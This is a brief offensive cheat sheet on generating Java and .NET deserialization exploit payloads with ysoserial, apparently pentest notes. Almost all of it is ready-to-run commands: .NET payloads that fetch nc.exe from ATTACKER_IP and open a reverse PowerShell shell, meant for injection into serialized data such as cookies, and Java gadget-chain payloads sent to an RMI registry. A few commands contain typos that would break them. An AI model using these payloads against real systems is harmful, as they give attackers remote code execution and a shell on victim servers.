# Ysoserial Deserialization Payload Generator

## Languages supported: .NET ASP, Java

## Repos: 

### https://github.com/frohoff/ysoserial (Java)

### https://github.com/pwntester/ysoserial.net (.NET ASP)

### Usage:

## .NET Deserialization

#### 1) unzip the zipped ysoserial file if you have downloaded it from the releases of the repository

#### 2) Then
 
    .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl ATTACKER_IP/nc.exe -o C:\ProgramData\nc.exe"

    .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\ProrgamData\nc.exe -e powershell ATTACKER_IP PORT"

### Inject the payload somewhere that uses serialized data like cookies (example)

## Java

    java -jar ysoserial.jar CommonsCollection1 calc.exe | xxd

    java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin

    nc 10.10.10.10 1099 < groovypayload.bin

    java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe


